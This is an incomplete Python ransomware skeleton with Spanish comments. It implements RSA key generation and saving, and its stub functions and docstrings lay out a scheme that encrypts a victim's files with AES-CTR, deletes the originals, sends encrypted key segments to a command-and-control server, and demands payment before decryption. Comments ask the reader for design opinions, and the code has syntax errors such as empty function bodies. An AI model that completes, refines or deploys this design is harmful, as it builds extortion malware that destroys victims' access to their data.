#!/usr/bin/env python3

import base64
import struct
import os
import sys
import socket
import argparse

from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import rsa, padding
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

llave_publica_permanente = """EJEMPLO"""

# Generar las llaves publica y privada locales
def generar_privada():
    return rsa.generate_private_key(
    public_exponent=65537,
    key_size=2048,
    backend=default_backend()
    )

def guardar_privada(ruta, privada):
    private_key_bytes = privada.private_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PrivateFormat.TraditionalOpenSSL,
        encryption_algorithm=serialization.NoEncryption()
    )
    with open(ruta, 'wb') as salida:
        salida.write(private_key_bytes)

def generar_publica(privada):
    return privada.public_key()

def guardar_publica(ruta, publica):
    public_key_bytes = publica.public_bytes(
        encoding=serialization.Encoding.PEM,
        format=serialization.PublicFormat.SubjectPublicKeyInfo
    )
    with open(ruta, 'wb') as salida:
        salida.write(public_key_bytes)

def segmentar_llave(llave_privada_local):
    #Esta funcion segmenta la llave privada local para que despues sea cifrada con la llave publica permanente

def cifrar_segmentos(segmentos_llave):
    #Esta funcion cifra los segmentos de la llave privada local para guardarlos y enviarselos al servidor CC en la fase de recuperacion

def enviar_segmentos(ip_servidor, puerto_servidor):
    #Esta funcion envia los segmentos al servidor CC

def cifrar_archivos(directorio, llave_publica_local):
    """
    Esta funcion cifra los archivos dentro de un directorio marcado usando AES-CTR
    se crea una llave AES y un IV por cada archivo dentro del directorio.
    Cifra cada archivo por via CTR usando la llave AES y el IV previamente creado.
    Se cifra la llave AES usando la llave publica local.
    El nuevo archivo cifrado se le agregaria el IV mas la llave cifrada al final.
    Se elimina el archivo original en texto plano.

    resultado: archivo+iv+llaveAEScifrada
    """

def descifrar_archivos(directorio, llave_privada_local):
    """
    Esta funcion descifra los archivos dentro de un directorio marcado usando AES-CTR
    Obtiene el IV y la llaveAES haciendo un rebanado (archivo+iv+llaveAEScifrada)
    Desifra la llave AES usando la llave privada local.
    Descifra cada archivo por CTR usando el IV y la llave AES previamente obtenido.
    El nuevo archivo esta descifrado y en texto plano.
    """

def ataque(directorio)
    """
    1. Genera las llaves RSA (publica y privada) - Llama a la funcion de crear llaves
    2. Segmenta la llave privada local - Llama a la funcion de segmentar
    3. Cifra los segmentos de la llave privada local - Llama a la funcion de cifrar segmentos
    4. Cifra los archivos de la victima - Llama a la funcion de cifrar archivos
    5. Muestra un mensaje diciendole a la victima que ha sido infectado y que debe de realizar el pago para recuperar sus archivos
    """

def recuperacion(directorio)
    """
    1. Pide a la victima una palabra para confirmar el pago, si la palabra es correcta sigue el proceso de recuperacion
    2. Envia los segmentos cifrados de la llave privada local al servidor CC - Llama a la funcion de enviar segmentos
    3. El servidor CC los descifra y se los envia al ransomware ya descifrados (en esta parte no se si hacer que el servidor una los segmentos o que lo haga el ransomware)
    4. Usando la llave privada local, se hace el proceso de descifrar archivos - Llama a la funcion descifrar archivos
    5. Muestra un mensaje diciendole a la victima que sus archivos han sido recuperados 
    """

if __name__ == "__main__":
    """pasar argumentos
    1. directorio: directorio donde se realizara el ataque
    2. ip del servidor CC : ip a donde va a mandar los segmentos de la llave RSA (esta parte dime que opinas, si pasar la ip como variable o ponerla dentro del script)
    
    - modos de uso:
        1. --ataque -directorio (para cifrar los archivos) - Llama a la funcion de ataque
        2. --recuperacion -directorio (para descifrar los archivos) -ip (para enviar los segmentos de la llave RSA cifrada) -p puerto del servidor - llama a la funcion de recuperacion
    """
